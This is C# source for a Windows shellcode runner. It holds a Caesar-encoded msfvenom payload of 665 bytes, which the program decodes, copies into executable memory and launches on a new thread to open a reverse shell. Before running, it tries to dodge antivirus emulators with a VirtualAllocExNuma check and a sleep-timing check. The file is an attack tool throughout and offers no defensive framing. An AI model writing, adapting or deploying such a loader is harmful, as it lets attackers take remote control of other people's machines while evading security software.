using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

// Run ShellcodeBuilder_Caesar
// Copy pasta the output as the new byte buffer :)
namespace ShellcodeRunner_Caesar_ExNuma
{
    class SCRunner_Caesar_ExNuma
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        // VirtualAllocExNuma below
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, UInt32 nndPreferred);

        // PInvoke GetCurrentProcess();
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        /// <summary>
        /// Creating a separate sleep function to wait for 2 milliseconds and see 
        /// if time is modified. If it is then we are likely running in an emulator
        /// so we exit.
        /// </summary>
        /// <returns>-</returns>
        public static async Task SleepForEmu()
        {
            DateTime InitTime = DateTime.Now;
            // We can use Thread.Sleep instead of the PInvoke method
            Thread.Sleep(2000);
            // Console.WriteLine($"[+] Time now is: {InitTime}");
            double TimeAfter = DateTime.Now.Subtract(InitTime).TotalSeconds;

            if (TimeAfter < 1.5)
            {
                Console.WriteLine("[-] We are in an emulator/simulator ! Cya ;(");
                return;
            }
            else
            {
                Console.WriteLine("[+] All seems good ! Shouldn't be in an emulator/simulator !");
            }
        }

        // Task is required while using async for automatic call
        static async Task Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            // If API is emulated will not return a mem address, therefore in an emulated environment
            if (mem == null)
            {
                Console.WriteLine("[-] No memory address ! Likely in emulated environment");
                return;
            } 
            else
            {
                Console.WriteLine("[+] Memory address exists ! Not in emulated environment");
            }

            await SleepForEmu();

            // buf size should be same as original one from msfvenom, array keeps value
            byte[] buf = new byte[665] {
                0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x4a, 0x33, 0xd4, 0x53, 0x58, 0x67, 0x4a,
                0x8d, 0x54, 0x62, 0x4a, 0x8d, 0x54, 0x1a, 0x4a, 0x8d, 0x54, 0x22, 0x4f, 0x33, 0xcb, 0x4a, 0x8d, 0x74, 0x52, 0x4a, 0x11, 0xb9, 0x4c,
                0x4c, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x43,
                0x53, 0x4a, 0x8d, 0x54, 0x22, 0x8d, 0x44, 0x3e, 0x4a, 0x03, 0xd2, 0x68, 0x83, 0x7a, 0x1a, 0x0d, 0x04, 0x11, 0x87, 0x74, 0x02, 0x02,
                0x02, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x69, 0x4a, 0x03, 0xd2, 0x46, 0x8d, 0x42, 0x22, 0x4b, 0x03, 0xd2,
                0x8d, 0x4a, 0x1a, 0x52, 0xe5, 0x58, 0x4a, 0x01, 0xcb, 0x4f, 0x33, 0xcb, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4a, 0x33, 0xc2,
                0xae, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda,
                0x5a, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x43, 0x8d, 0x0e, 0x4a, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x8d,
                0x06, 0x8a, 0x43, 0x5a, 0x43, 0x5a, 0x60, 0x4a, 0x03, 0xd2, 0x5b, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22,
                0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x4a, 0x8d, 0x14, 0xeb, 0x4d, 0x01, 0x01, 0x01, 0x5f, 0x4a, 0x33, 0xdd, 0x55, 0x4b,
                0xc0, 0x79, 0x6b, 0x70, 0x6b, 0x70, 0x67, 0x76, 0x02, 0x43, 0x58, 0x4a, 0x8b, 0xe3, 0x4b, 0xc9, 0xc4, 0x4e, 0x79, 0x28, 0x09, 0x01,
                0xd7, 0x55, 0x55, 0x4a, 0x8b, 0xe3, 0x55, 0x5c, 0x4f, 0x33, 0xc2, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xbc, 0x3c, 0x58, 0x7b, 0xa9,
                0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0x0e, 0x02, 0x02, 0x02, 0x33, 0x32, 0x30, 0x33, 0x32, 0x30, 0x32, 0x30, 0x33, 0x34, 0x3a,
                0x02, 0x5c, 0x4a, 0x8b, 0xc3, 0x4b, 0xc9, 0xc2, 0xbd, 0x03, 0x02, 0x02, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x6c, 0x05, 0x55, 0x4b, 0xbc,
                0x59, 0x8b, 0xa1, 0xc8, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0x74, 0x02, 0x02, 0x02, 0x31, 0x35, 0x5a, 0x35, 0x61, 0x68, 0x4a,
                0x45, 0x6e, 0x6c, 0x49, 0x52, 0x4b, 0x55, 0x4f, 0x6e, 0x4d, 0x73, 0x54, 0x6b, 0x3a, 0x67, 0x53, 0x45, 0x65, 0x63, 0x53, 0x66, 0x32,
                0x74, 0x61, 0x36, 0x66, 0x3a, 0x65, 0x63, 0x5b, 0x52, 0x6e, 0x44, 0x49, 0x6b, 0x45, 0x58, 0x7a, 0x66, 0x3a, 0x59, 0x6d, 0x6e, 0x66,
                0x6b, 0x72, 0x6c, 0x74, 0x33, 0x49, 0x7c, 0x3b, 0x63, 0x49, 0x5c, 0x71, 0x4e, 0x77, 0x5a, 0x61, 0x74, 0x65, 0x4b, 0x6a, 0x43, 0x4d,
                0x77, 0x59, 0x5b, 0x63, 0x79, 0x50, 0x73, 0x69, 0x52, 0x43, 0x46, 0x70, 0x65, 0x43, 0x72, 0x72, 0x2f, 0x73, 0x67, 0x36, 0x6e, 0x35,
                0x52, 0x56, 0x70, 0x2f, 0x5b, 0x53, 0x4a, 0x69, 0x6f, 0x37, 0x7b, 0x49, 0x72, 0x6d, 0x54, 0x50, 0x4d, 0x37, 0x02, 0x4a, 0x8b, 0xc3,
                0x55, 0x5c, 0x43, 0x5a, 0x4f, 0x33, 0xcb, 0x55, 0x4a, 0xba, 0x02, 0x34, 0xaa, 0x86, 0x02, 0x02, 0x02, 0x02, 0x52, 0x55, 0x55, 0x4b,
                0xc9, 0xc4, 0xed, 0x57, 0x30, 0x3d, 0x01, 0xd7, 0x4a, 0x8b, 0xc8, 0x6c, 0x0c, 0x61, 0x4a, 0x8b, 0xf3, 0x6c, 0x21, 0x5c, 0x54, 0x6a,
                0x82, 0x35, 0x02, 0x02, 0x4b, 0x8b, 0xe2, 0x6c, 0x06, 0x43, 0x5b, 0x4b, 0xbc, 0x77, 0x48, 0xa0, 0x88, 0x02, 0x02, 0x02, 0x02, 0x01,
                0xd7, 0x4f, 0x33, 0xc2, 0x55, 0x5c, 0x4a, 0x8b, 0xf3, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0x2f, 0x08,
                0x1a, 0x7d, 0x01, 0xd7, 0x87, 0xc2, 0x77, 0x21, 0x4a, 0xc9, 0xc3, 0x8a, 0x15, 0x02, 0x02, 0x4b, 0xbc, 0x46, 0xf2, 0x37, 0xe2, 0x02,
                0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x01, 0xd1, 0x76, 0x04, 0xed, 0xac, 0xea, 0x57, 0x02, 0x02, 0x02, 0x55, 0x5b, 0x6c, 0x42, 0x5c,
                0x4b, 0x8b, 0xd3, 0xc3, 0xe4, 0x12, 0x4b, 0xc9, 0xc2, 0x02, 0x12, 0x02, 0x02, 0x4b, 0xbc, 0x5a, 0xa6, 0x55, 0xe7, 0x02, 0x02, 0x02,
                0x02, 0x01, 0xd7, 0x4a, 0x95, 0x55, 0x55, 0x4a, 0x8b, 0xe9, 0x4a, 0x8b, 0xf3, 0x4a, 0x8b, 0xdc, 0x4b, 0xc9, 0xc2, 0x02, 0x22, 0x02,
                0x02, 0x4b, 0x8b, 0xfb, 0x4b, 0xbc, 0x14, 0x98, 0x8b, 0xe4, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x85, 0xc6, 0x22, 0x87, 0xc2,
                0x76, 0xb4, 0x68, 0x8d, 0x09, 0x4a, 0x03, 0xc5, 0x87, 0xc2, 0x77, 0xd4, 0x5a, 0xc5, 0x5a, 0x6c, 0x02, 0x5b, 0x4b, 0xc9, 0xc4, 0xf2,
                0xb7, 0xa4, 0x58, 0x01, 0xd7 };

            // apply caesar cipher
            Console.WriteLine("[*] Decrypting shellcode");
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            int size = buf.Length;

            Console.WriteLine("[*] Allocating VirtualAlloc");
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            try
            {
                if (true)
                {
                    Marshal.Copy(buf, 0, addr, size);
                    Console.WriteLine("[+] Shellcode in memory");
                    Console.WriteLine("[+] Check for reverse shell !");
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Exception when marshaling shellcode in memory");
                throw e;
            }

            try
            {
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                if (true)
                {
                    WaitForSingleObject(hThread, 0xFFFFFFFF);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Couldn't create thread for shellcode");
                throw e;
            }

            /*
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
            */

        }
    }
}